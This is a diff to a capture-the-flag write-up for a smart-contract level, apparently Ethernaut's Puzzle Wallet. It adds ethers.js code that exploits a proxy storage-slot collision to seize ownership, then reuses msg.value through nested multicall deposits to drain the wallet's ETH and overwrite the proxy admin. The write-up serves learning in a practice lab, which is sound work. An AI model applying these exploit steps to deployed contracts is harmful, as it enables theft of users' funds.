@@ -29,17 +29,17 @@ Jeez this one was difficult.... I outlined each step in detail in comments in sc
 
 The first step is realizing that you can connect to both the proxy & wallet contracts with the same contract address.
 Using that knowledge, you can call 
-'''
-proposeNewAdmin(YOUR_ADDRESS)
-''' 
+```js
+await proxy.connect(player).proposeNewAdmin(player.address);
+```
 on the proxy contract to make yourself the owner
 of the wallet contract (the function overwrites slot 0 in both contracts).
 
 The second step is adding yourself to the whitelist to be able to perform functions on the wallet contract. Now that you're
 the owner of teh wallet contract you can just call 
-'''
-addToWhitelist(YOUR_ADDRESS)
-'''
+```js
+await wallet.connect(player).addToWhitelist(player.address)
+```
 
 Now that we can perform actions on the wallet contract, we need to call "setMaxBalance" to overwrite slot 1 in both contracts (including the admin address in the proxy.. our goal).
 
@@ -47,11 +47,19 @@ Before we can do taht though we need to make the contract have 0 balance. To dra
 - deposit --> adds eth to the contract and increments our balance to 1 contract balance
 - multicall(deposit) --> we then have to re-call multicall to reset the flag that we aren't reusing our msg.value. this sets our balance to 2 contract balances even though we're only sending 1 contract balance.
 - execute(YOUR_ADDRESS, contract balance * 2, []) --> we withdraw 2 contract balances worth of ETH to drain the contract
+```js
+const contractEth = await hre.ethers.provider.getBalance(wallet.address);
+const func1 = wallet.interface.encodeFunctionData('deposit');
+const func2 = wallet.interface.encodeFunctionData('multicall', [[func1]]);
+const func3 = wallet.interface.encodeFunctionData('execute', [player.address, contractEth*2, []]);
+const funcArray = [func1, func2, func3];
+await wallet.connect(player).multicall(funcArray, { from: player.address, value: contractEth });
+```
 
 Now that the contract is drained we can call 
-'''
-setMaxBalance(YOUR_ADDRESS)
-'''
+```js
+await wallet.connect(player).setMaxBalance(player.address)
+```
 to beat the level.
 
 ## Problem 25
